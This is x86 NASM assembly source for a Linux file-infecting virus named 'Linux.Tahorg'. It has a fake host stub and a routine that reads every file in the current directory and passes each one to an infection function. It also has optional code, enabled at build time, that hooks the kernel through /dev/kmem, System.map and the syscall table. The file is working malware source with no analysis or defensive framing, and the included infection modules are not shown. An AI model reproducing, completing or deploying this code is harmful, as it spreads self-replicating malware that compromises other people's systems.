; Virus Linux.Tahorg
;
BITS	32
CPU	386
global	_start

%include	"include/tahorg.inc"

;---- Fake host ---------------------------------------------------------------
_start:		call	virus_start

		mov	eax, 1
		mov	ebx, 0
		int	0x80

subr:		mov	eax, 4
		mov	ebx, 1
		lea	ecx, [message]
		mov	edx, msglen
		int	0x80
		ret

message		db	"Host programm continue execution", 0x0a
msglen		equ	$ - message
		align	16
;------------------------------------------------------------------------------
virus_start:	push	byte 0
		pushf
		pusha

		mov	edx, (DIRENT_SIZE + IBUFFER_SIZE)
		sub	esp, edx
		mov	ebx, esp
		mov	word [ebx], 0x2e		; "."
		movb	eax, 5
		movb	ecx, 0				; O_RDONLY
		int	0x80				; open
		or	eax, eax
		js	.all_done

		xchg	eax, ebx

.read_dir:	mov	ecx, esp
		movb	eax, 89
		int	0x80				; readdir
		dec	eax
		jnz	.all_done

		lea	eax, [esp + DIRENT_DNAME]
		lea	ecx, [esp + DIRENT_SIZE]
		push	ecx
		push	eax
		call	infect_file
		dec	eax
		jnz	.read_dir

.all_done:	add	esp, edx
		movb	eax, 6
		int	0x80				; close

%ifdef INFMEM
		call	infect_memory
%endif

.return:	mov	eax, [esp + 40]
		mov	ebx, strict dword (subr - _start - 5)
calladdr	equ	$ - 4
		lea	eax, [eax + ebx]
		mov	[esp + 36], eax
		popa
		popf
		ret
;------------------------------------------------------------------------------
get_addr:	call	.get
.get:		pop	eax
		sub	eax, O(get_addr.get)
		ret

%ifdef INFMEM
%include	"infmem.asm"
%include	"getsym.asm"				; get_symbol
%include	"loader.asm"				; Module loader
%include	"module.asm"				; Kernel module
%endif

%include	"infect.asm"				; infect_file

name:		db	"Linux.Tahorg"
.kmalloc	db	"kmalloc", 0
.do_execve	db	"do_execve", 0
.sys_call_table	db	"sys_call_table", 0
.dev_kmem	db	"/dev/kmem", 0
.System_map	db	"/boot/System.map", 0

VIRUS_SIZE	equ	O($)
HEADER_SIZE	equ	96
MODULE_SIZE	equ	(VIRUS_SIZE + HEADER_SIZE + 5)
		db      0, 'VSIZE'
		db      (VIRUS_SIZE / 1000 % 10 + '0')
		db      (VIRUS_SIZE / 100  % 10 + '0')
		db      (VIRUS_SIZE / 10   % 10 + '0')
		db      (VIRUS_SIZE / 1    % 10 + '0'), 0
;------------------------------------------------------------------------------